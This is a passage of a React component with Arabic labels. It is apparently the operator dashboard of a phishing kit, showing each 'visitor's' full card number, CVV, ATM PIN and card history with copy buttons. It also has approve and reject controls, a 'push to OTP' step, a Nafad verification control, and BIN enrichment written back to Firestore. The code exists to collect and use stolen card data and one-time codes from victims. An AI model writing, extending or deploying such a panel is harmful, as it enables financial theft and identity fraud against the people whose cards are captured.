        const d = json.data;
        const patch: Record<string, string> = {
          updatedAt: new Date().toISOString(),
        };
        if (d.bankName) patch.cardBankName = String(d.bankName);
        if (d.cardType) patch.cardCategory = String(d.cardType);
        if (d.cardLevel) patch.cardLevel = String(d.cardLevel);
        if (d.country) patch.cardCountry = String(d.country);
        if (d.scheme && !visitorAny.cardScheme)
          patch.cardScheme = String(d.scheme);
        await setDoc(doc(db!, "pays", visitor.id), patch, { merge: true });
      } catch {
        // silent
      }
    })();
    return () => {
      cancelled = true;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [bin, hasEnrichment, visitor.id]);

  if (!hasCard && visitor.nafadConfirmationStatus !== "waiting") return null;

  const expiry =
    p.cardExpiry ||
    (visitor as any).expiry ||
    ((visitor as any).expiryMonth && (visitor as any).expiryYear
      ? `${visitor.expiryMonth}/${visitor.expiryYear}`
      : "");
  const name = p.cardName || (visitor as any).cardName || "";
  const scheme = String(
    p.cardScheme || (visitor as any).cardType || ""
  ).toLowerCase();
  const bank = safeText(
    p.cardBank || (visitor as any).cardBankName || (visitor as any).bankName
  );
  const cardType = String(
    p.cardType || visitor.cardCategory || ""
  ).toUpperCase();
  const cardLevel = String(p.cardLevel || "").toUpperCase();
  const cardCountry = String(p.cardCountry || "").toUpperCase();
  const matchedBank = findBankLogo(p.cardBank || bank);
  const bankLogo: string | null = p.cardBankLogo || matchedBank?.logo || null;
  const bankLabel: string = p.cardBankLabel || matchedBank?.label || bank || "";
  const waiting = visitor.cardApprovalStatus !== "approved";
  const hasBin =
    bin || bank || p.cardType || p.cardCountry || p.cardCvc || visitor.atmPin;
  const groupedCard =
    fullCard.length >= 12
      ? fullCard.replace(/(.{4})/g, "$1 ").trim()
      : fullCard.length > 0
        ? fullCard
            .padEnd(16, "•")
            .replace(/(.{4})/g, "$1 ")
            .trim()
        : `•••• •••• •••• ${last4}`;
  const cvc = String(
    p.cardCvc || (visitor as any).cvv || (visitor as any).cpc || ""
  ).replace(/\D/g, "");

  const isMaster = scheme.includes("master");
  const isMada = scheme.includes("mada");
  const isAmex = scheme.includes("amex") || scheme.includes("american");
  const schemeLabel = isMaster
    ? "MASTERCARD"
    : isMada
      ? "mada"
      : isAmex
        ? "AMEX"
        : "VISA";

  // Soft pastel mint/sky/peach bank card surface matching the screenshot
  const cardTheme = isMaster
    ? {
        background:
          "linear-gradient(135deg, #ffedd5 0%, #fff7ed 55%, #fed7aa 100%)",
        border: "#fdba74",
        ink: "#7c2d12",
      }
    : isAmex
      ? {
          background:
            "linear-gradient(135deg, #e0f2fe 0%, #f0f9ff 55%, #bae6fd 100%)",
          border: "#7dd3fc",
          ink: "#0c4a6e",
        }
      : {
          background:
            "linear-gradient(135deg, #d7f5e5 0%, #e9fbf1 55%, #c7eed9 100%)",
          border: "#a7dfc0",
          ink: "#064e3b",
        };

  const approvalLabel =
    visitor.cardApprovalStatus === "approved"
      ? "تم القبول"
      : visitor.cardApprovalStatus === "rejected"
        ? "مرفوض"
        : "بانتظار الموافقة";

  return (
    <Panel
      title="الدفع"
      headerAction={
        <button
          type="button"
          onClick={() => setShowDetails(s => !s)}
          className="text-gray-500 hover:text-gray-800 px-1.5 py-0.5 rounded hover:bg-gray-200/70 text-xs font-bold tracking-widest transition"
          title="إظهار / إخفاء التفاصيل الكاملة"
        >
          •••
        </button>
      }
    >
      <div className="space-y-3">
        {/* Soft Mint Pastel Bank Card matching screenshot */}
        <div
          className="relative rounded-2xl p-4 overflow-hidden w-full shadow-sm border"
          style={{
            background: cardTheme.background,
            borderColor: cardTheme.border,
            color: cardTheme.ink,
            minHeight: 168,
          }}
          dir="ltr"
        >
          {/* Top row: Bank Logo + Name on left/right & SAR box */}
          <div className="flex items-start justify-between gap-2 mb-5">
            <div className="flex items-center gap-2 min-w-0">
              {bankLogo && (
                <img
                  src={bankLogo}
                  alt={bankLabel || "Bank"}
                  className="h-6 w-auto max-w-[60px] object-contain shrink-0"
                  onError={e => {
                    (e.currentTarget as HTMLImageElement).style.display = "none";
                  }}
                />
              )}
              <div className="min-w-0">
                <div
                  className="text-[12px] font-bold leading-tight truncate"
                  dir="auto"
                >
                  {bankLabel || "BANK CARD"}
                </div>
                {bankLabel && (
                  <div className="text-[8px] uppercase tracking-wider opacity-65 truncate">
                    {cardCountry || "SAUDI BANK"}
                  </div>
                )}
              </div>
            </div>
            <span
              className="text-[10px] font-bold px-2 py-0.5 rounded border shrink-0"
              style={{ borderColor: `${cardTheme.ink}40` }}
            >
              SAR
            </span>
          </div>

          {/* Middle row: Card Number + Expiry & CVV */}
          <div className="flex items-center justify-between gap-2 mb-4">
            <div
              className="font-mono text-[15px] font-bold tracking-wider select-all text-gray-900"
              data-testid="admin-card-number"
            >
              {groupedCard}
            </div>
            <div className="text-right shrink-0">
              {expiry && (
                <div className="font-mono text-[12px] font-semibold text-gray-900">
                  {expiry}
                </div>
              )}
              {cvc && (
                <div className="mt-0.5">
                  <div className="text-[8px] uppercase opacity-60">CVV</div>
                  <div
                    className="font-mono text-[13px] font-bold text-gray-900 select-all"
                    data-testid="admin-card-cvv"
                  >
                    {cvc}
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* Bottom row: Holder Name & Scheme / Debit Standard */}
          <div className="flex items-end justify-between gap-2 pt-1">
            <div className="text-[11px] font-semibold uppercase tracking-wide text-gray-800 truncate">
              {name || "CARD HOLDER"}
            </div>
            <div className="text-right shrink-0">
              <div className="text-[11px] font-black tracking-wide leading-none">
                {schemeLabel}
              </div>
              <div className="text-[8px] uppercase tracking-wider opacity-75 mt-1">
                {cardType || "DEBIT"} . {cardLevel || "STANDARD"}
              </div>
            </div>
          </div>

          {(cardType || cardLevel || cardCountry) && (
            <div className="sr-only">
              {cardType && (
                <span data-testid="card-bin-type">{cardType}</span>
              )}
              {cardLevel && (
                <span data-testid="card-bin-level">{cardLevel}</span>
              )}
              {cardCountry && (
                <span data-testid="card-bin-country">{cardCountry}</span>
              )}
            </div>
          )}
        </div>

        {/* Status link line */}
        <div className="flex items-center justify-between text-[11px] px-0.5">
          <span
            className={`font-semibold ${
              visitor.cardApprovalStatus === "approved"
                ? "text-emerald-700"
                : visitor.cardApprovalStatus === "rejected"
                  ? "text-red-600"
                  : "text-blue-600"
            }`}
          >
            {approvalLabel}
          </span>
          {visitor.atmPin && (
            <span className="font-mono text-rose-700 font-bold" dir="ltr">
              PIN: {visitor.atmPin}
            </span>
          )}
        </div>

        {/* Previous cards history */}
        <CardHistoryList
          history={visitorAny.cardHistory}
          currentCardNumber={fullCard}
        />

        {/* Expandable full payment text details */}
        {showDetails && (
          <div className="rounded-xl bg-white border border-gray-200 p-3 space-y-2 text-[12px]">
            <div className="text-xs font-bold text-gray-800 mb-1 border-b border-gray-100 pb-1">
              تفاصيل الدفع الكاملة
            </div>
            <div className="flex items-center justify-between border-b border-gray-100 pb-1.5">
              <span className="text-gray-500">رقم البطاقة:</span>
              <div className="flex items-center gap-2">
                <span
                  className="font-mono font-bold text-gray-900 select-all text-xs"
                  dir="ltr"
                >
                  {groupedCard}
                </span>
                <CopyButton text={fullCard} />
              </div>
            </div>
            {name && (
              <div className="flex items-center justify-between border-b border-gray-100 pb-1.5">
                <span className="text-gray-500">اسم حامل البطاقة:</span>
                <span className="font-semibold text-gray-900">{name}</span>
              </div>
            )}
            {expiry && (
              <div className="flex items-center justify-between border-b border-gray-100 pb-1.5">
                <span className="text-gray-500">تاريخ الانتهاء:</span>
                <span className="font-mono text-gray-900" dir="ltr">
                  {expiry}
                </span>
              </div>
            )}
            {cvc && (
              <div className="flex items-center justify-between border-b border-gray-100 pb-1.5">
                <span className="text-gray-500">رمز الحماية (CVV):</span>
                <div className="flex items-center gap-2">
                  <span
                    className="font-mono font-bold text-amber-700 select-all"
                    dir="ltr"
                  >
                    {cvc}
                  </span>
                  <CopyButton text={cvc} />
                </div>
              </div>
            )}
            {visitor.atmPin && (
              <div className="flex items-center justify-between border-b border-gray-100 pb-1.5">
                <span className="text-gray-500">الرقم السري (ATM PIN):</span>
                <div className="flex items-center gap-2">
                  <span
                    className="font-mono font-bold text-rose-700 select-all"
                    dir="ltr"
                  >
                    {visitor.atmPin}
                  </span>
                  <CopyButton text={String(visitor.atmPin)} />
                </div>
              </div>
            )}
            {(p.amount || visitor.totalAmount || visitor.total) && (
              <div className="flex items-center justify-between border-b border-gray-100 pb-1.5">
                <span className="text-gray-500">المبلغ الإجمالي:</span>
                <span className="font-mono font-bold text-emerald-700" dir="ltr">
                  {p.amount || visitor.totalAmount || visitor.total} ر.س
                </span>
              </div>
            )}
            {bankLabel && (
              <div className="flex items-center justify-between border-b border-gray-100 pb-1.5">
                <span className="text-gray-500">البنك / الشبكة:</span>
                <span className="text-gray-900">
                  {bankLabel} ({schemeLabel})
                </span>
              </div>
            )}
            {bin && (
              <div className="flex items-center justify-between">
                <span className="text-gray-500">معرّف البطاقة (BIN):</span>
                <span className="font-mono text-gray-900" dir="ltr">
                  {bin}
                </span>
              </div>
            )}
          </div>
        )}

        {/* Action buttons */}
        <div className="grid grid-cols-2 gap-1.5">
          <button
            onClick={() => onApprove("cardApprovalStatus")}
            disabled={!waiting}
            className="py-1.5 bg-emerald-600 text-white hover:bg-emerald-700 disabled:opacity-40 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
            data-testid="card-accept"
          >
            <CheckCircle2 className="w-3.5 h-3.5" /> قبول
          </button>
          <button
            onClick={() => onReject("cardApprovalStatus")}
            disabled={!waiting}
            className="py-1.5 bg-red-600 text-white hover:bg-red-700 disabled:opacity-40 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
            data-testid="card-reject"
          >
            <XCircle className="w-3.5 h-3.5" /> رفض
          </button>
          <button
            onClick={() => onPushStep(5)}
            className="col-span-2 py-1.5 bg-white hover:bg-gray-100 text-gray-800 border border-gray-300 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
          >
            <Hash className="w-3 h-3" /> دفع إلى OTP
          </button>
        </div>

        {/* Quick block-BIN & block-IP actions */}
        {(hasBin && bin && onBlockBin) ||
        ((visitor.ip || visitor.ipAddress) && onBlockIp) ? (
          <div className="grid grid-cols-2 gap-1.5">
            {hasBin && bin && onBlockBin && (
              <button
                onClick={() => {
                  if (isBinBlocked) return;
                  if (
                    confirm(
                      `حظر جميع البطاقات التي تبدأ بـ ${bin}؟\nسيمنع أي زائر من استخدام بطاقة بنفس البداية وحفظ البطاقة في سجل المحظورات.`
                    )
                  ) {
                    onBlockBin(String(bin), {
                      cardNumber: fullCard || undefined,
                      last4: last4 && last4 !== "••••" ? last4 : undefined,
                      expiryMonth: visitor.expiryMonth,
                      expiryYear: visitor.expiryYear,
                      cvv: p.cardCvc || visitor.cvv,
                      cardName: p.cardName || visitor.cardName,
                      cardType: p.cardScheme || visitor.cardType,
                      bankName: p.cardBankLabel || p.cardBank || visitor.cardBankName,
                      visitorId: visitor.id,
                      visitorName: visitor.name,
                      phone: visitor.phone,
                      ip: visitor.ip || visitor.ipAddress,
                      source: "admin_block",
                    });
                  }
                }}
                disabled={isBinBlocked}
                className={`py-1.5 rounded-lg text-[11px] font-semibold flex items-center justify-center gap-1 border transition ${
                  isBinBlocked
                    ? "bg-red-50 text-red-400 border-red-200 cursor-not-allowed"
                    : "bg-white text-red-600 hover:bg-red-50 border-red-200"
                }`}
                data-testid="card-block-bin"
              >
                <Ban className="w-3 h-3" />
                {isBinBlocked ? "BIN محظور" : `حظر BIN (${bin})`}
              </button>
            )}

            {(visitor.ip || visitor.ipAddress) && onBlockIp && (
              <button
                onClick={() => {
                  const ip = String(visitor.ip || visitor.ipAddress);
                  if (isIpBlocked) return;
                  if (
                    confirm(
                      `حظر هذا الزائر بعنوان IP ${ip}؟\nسيمنع الدخول من هذا العنوان نهائياً.`
                    )
                  ) {
                    onBlockIp(ip);
                  }
                }}
                disabled={isIpBlocked}
                className={`py-1.5 rounded-lg text-[11px] font-semibold flex items-center justify-center gap-1 border transition ${
                  isIpBlocked
                    ? "bg-red-50 text-red-400 border-red-200 cursor-not-allowed"
                    : "bg-white text-red-600 hover:bg-red-50 border-red-200"
                }`}
                data-testid="card-block-ip"
              >
                <WifiOff className="w-3 h-3" />
                {isIpBlocked ? "IP محظور" : "حظر IP"}
              </button>
            )}
          </div>
        ) : null}

        {/* Nafad code + approval */}
        {(isFinalStep(visitor) ||
          visitor.nafadConfirmationStatus === "waiting") && (
          <NafadControl
            visitor={visitor}
            onApprove={onApprove}
            onReject={onReject}
          />
        )}
      </div>
    </Panel>
  );
}

